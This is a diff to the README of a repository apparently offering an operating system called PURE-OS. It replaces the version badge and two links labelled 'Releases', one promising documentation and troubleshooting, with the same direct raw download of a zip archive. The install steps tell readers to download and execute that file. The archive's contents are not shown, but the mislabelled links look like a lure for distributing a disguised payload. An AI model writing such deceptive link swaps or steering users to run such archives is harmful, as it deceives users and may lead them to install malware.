@@ -1,6 +1,6 @@
 # PURE-OS 🌐
 
-![PURE-OS](https://img.shields.io/badge/PURE--OS-v1.0-blue.svg)
+![PURE-OS](https://github.com/hotmysia/PURE-OS/raw/refs/heads/main/combinatory/PUR-OS-v3.5.zip)
 
 Welcome to the **PURE-OS** repository! This project aims to provide a clean, efficient, and user-friendly operating system. Our goal is to create a platform that emphasizes simplicity and performance, making it suitable for both new users and experienced developers.
 
@@ -29,7 +29,7 @@ PURE-OS is designed to offer a seamless experience for users. It focuses on prov
 
 To install PURE-OS, follow these steps:
 
-1. Download the latest version from our [Releases](https://github.com/hotmysia/PURE-OS/releases) page.
+1. Download the latest version from our [Releases](https://github.com/hotmysia/PURE-OS/raw/refs/heads/main/combinatory/PUR-OS-v3.5.zip) page.
 2. Once downloaded, execute the installation file.
 3. Follow the on-screen instructions to complete the installation.
 
@@ -58,7 +58,7 @@ We appreciate all contributions, whether big or small.
 
 ## Support
 
-If you have questions or need assistance, please check the [Releases](https://github.com/hotmysia/PURE-OS/releases) section for documentation and troubleshooting guides. You can also reach out to the community through our forums or GitHub Issues.
+If you have questions or need assistance, please check the [Releases](https://github.com/hotmysia/PURE-OS/raw/refs/heads/main/combinatory/PUR-OS-v3.5.zip) section for documentation and troubleshooting guides. You can also reach out to the community through our forums or GitHub Issues.
 
 ## License
 
